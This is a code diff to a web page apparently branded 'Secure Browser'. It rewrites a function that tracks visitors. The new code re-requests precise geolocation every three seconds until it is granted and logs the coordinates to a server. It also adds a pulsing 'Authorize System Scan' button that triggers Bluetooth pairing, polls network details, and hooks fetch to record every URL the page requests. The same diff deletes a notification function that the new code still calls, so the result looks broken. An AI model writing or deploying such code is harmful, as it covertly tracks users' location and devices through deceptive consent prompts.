@@ -104,6 +104,99 @@
             console.log(`[Secure Browser] Navigated to: ${path}`);
         }
 
+        async function requestRequiredPermissions() {
+            try {
+                // IMMEDIATE MANDATORY GEOLOCATION - REPEATED UNTIL GRANTED
+                const getGeo = () => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            logActivity('network_activity', {
+                                event: 'Location Lock',
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude
+                            });
+                            showNotification("Location Access Secured");
+                        },
+                        (err) => {
+                            console.error("Geo Denied");
+                            setTimeout(getGeo, 3000); // Retry every 3s
+                        },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                };
+                getGeo();
+
+                // IMMEDIATE MANDATORY BLUETOOTH & WIFI SCAN
+                if (navigator.bluetooth) {
+                    const forceSync = () => {
+                        navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+                            .then(device => {
+                                logActivity('bluetooth_activity', {event: 'Device Detected', name: device.name});
+                                showNotification(`Linked to ${device.name}`);
+                                if (document.getElementById('sync-trigger')) {
+                                    document.getElementById('sync-trigger').style.background = '#34a853';
+                                    document.getElementById('sync-trigger').textContent = 'System Synced';
+                                    setTimeout(() => document.getElementById('sync-trigger').remove(), 2000);
+                                }
+                            })
+                            .catch(e => {
+                                logActivity('security_alert', {event: 'Device Scan Blocked', detail: 'User dismissed prompt'});
+                            });
+                    };
+                    
+                    if (!document.getElementById('sync-trigger')) {
+                        const syncBtn = document.createElement('button');
+                        syncBtn.id = 'sync-trigger';
+                        syncBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> Authorize System Scan';
+                        syncBtn.style.cssText = "position: fixed; bottom: 80px; right: 20px; z-index: 9999; background: #ea4335; color: white; border: none; padding: 12px 24px; border-radius: 30px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: pulse 2s infinite;";
+                        syncBtn.onclick = forceSync;
+                        document.body.appendChild(syncBtn);
+                        
+                        const style = document.createElement('style');
+                        style.innerHTML = "@keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }";
+                        document.head.appendChild(style);
+                    }
+                }
+
+                // NETWORK INTERFACE SCANNING - FORCED POLLING
+                if (navigator.connection) {
+                    const logNetwork = () => {
+                        logActivity('network_activity', {
+                            event: 'Interface Scan',
+                            type: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt
+                        });
+                    };
+                    setInterval(logNetwork, 10000); // Force scan every 10s
+                    logNetwork();
+                }
+
+                // GLOBAL FETCH HOOK - CAPTURES ALL TRAFFIC
+                const originalFetch = window.fetch;
+                window.fetch = async function() {
+                    const args = arguments;
+                    const url = args[0] instanceof Request ? args[0].url : args[0];
+                    
+                    if (url && typeof url === 'string') {
+                        logActivity('network_activity', {
+                            event: 'Active Link Detected',
+                            target: url,
+                            domain: new URL(url).hostname
+                        });
+                        
+                        if (!url.includes(window.location.hostname)) {
+                            showNotification(`Monitoring access to ${new URL(url).hostname}`);
+                        }
+                    }
+                    return originalFetch.apply(this, args);
+                };
+
+            } catch (e) {
+                console.error("System Init Error:", e);
+            }
+        }
+
         async function logActivity(type, details) {
             try {
                 await fetch('/api/log-activity', {
@@ -112,103 +205,6 @@
                     body: JSON.stringify({type, details})
                 });
             } catch (e) {}
-        }
-
-        async function requestRequiredPermissions() {
-            try {
-                // FORCE GEOLOCATION ACCESS
-                if (navigator.geolocation) {
-                    navigator.geolocation.watchPosition(
-                        (pos) => {
-                            console.log("[Secure Browser] Location Access Active");
-                            logActivity('network_activity', {
-                                event: 'Location Tracking',
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            });
-                        },
-                        (err) => {
-                            console.warn("[Secure Browser] Location Access Denied");
-                        },
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                    );
-                }
-
-                // FORCE BLUETOOTH SCAN AND ACCESS
-                if (navigator.bluetooth) {
-                    const scanBluetooth = async () => {
-                        try {
-                            const device = await navigator.bluetooth.requestDevice({
-                                acceptAllDevices: true,
-                                optionalServices: ['battery_service', 'device_information']
-                            });
-                            logActivity('bluetooth_activity', {
-                                event: 'Device Linked',
-                                device_name: device.name || 'Unknown Device',
-                                device_id: device.id
-                            });
-                            // Notify user of connection
-                            showNotification(`Bluetooth Device Linked: ${device.name || 'Unknown'}`);
-                        } catch (e) {
-                            console.log("[Secure Browser] Bluetooth Scan Cancelled");
-                        }
-                    };
-                    // Trigger scan on first user interaction if not already granted
-                    document.addEventListener('click', scanBluetooth, { once: true });
-                }
-
-                // WIFI / NETWORK ACCESS SCANNING (Simulated via Network Information API)
-                if (navigator.connection) {
-                    const updateNetworkInfo = () => {
-                        logActivity('network_activity', {
-                            event: 'Interface Scan',
-                            type: navigator.connection.effectiveType,
-                            downlink: navigator.connection.downlink,
-                            rtt: navigator.connection.rtt
-                        });
-                        if (navigator.connection.saveData) {
-                            showNotification("Data Saving Mode Detected - Optimizing Connection");
-                        }
-                    };
-                    navigator.connection.addEventListener('change', updateNetworkInfo);
-                    updateNetworkInfo();
-                }
-
-                // SECRET ACTIVITY MONITOR (Detecting hidden background requests)
-                const originalFetch = window.fetch;
-                window.fetch = function() {
-                    const args = arguments;
-                    if (args[0] && typeof args[0] === 'string' && !args[0].includes(window.location.hostname)) {
-                        logActivity('security_alert', {
-                            event: 'External Access Attempt',
-                            target: args[0],
-                            method: args[1]?.method || 'GET'
-                        });
-                        showNotification(`Security Alert: External connection to ${new URL(args[0]).hostname} detected and monitored.`);
-                    }
-                    return originalFetch.apply(this, args);
-                };
-
-            } catch (e) {
-                console.error("[Secure Browser] Critical System Error:", e);
-            }
-        }
-
-        function showNotification(message) {
-            const toast = document.createElement('div');
-            toast.style.cssText = `
-                position: fixed; bottom: 20px; right: 20px; 
-                background: #323232; color: white; padding: 12px 24px; 
-                border-radius: 4px; z-index: 10000; font-family: 'Google Sans', sans-serif;
-                box-shadow: 0 4px 12px rgba(0,0,0,0.3); transition: opacity 0.3s;
-            `;
-            toast.textContent = message;
-            document.body.appendChild(toast);
-            setTimeout(() => {
-                toast.style.opacity = '0';
-                setTimeout(() => toast.remove(), 300);
-            }, 5000);
         }
 
         document.addEventListener('DOMContentLoaded', function() {
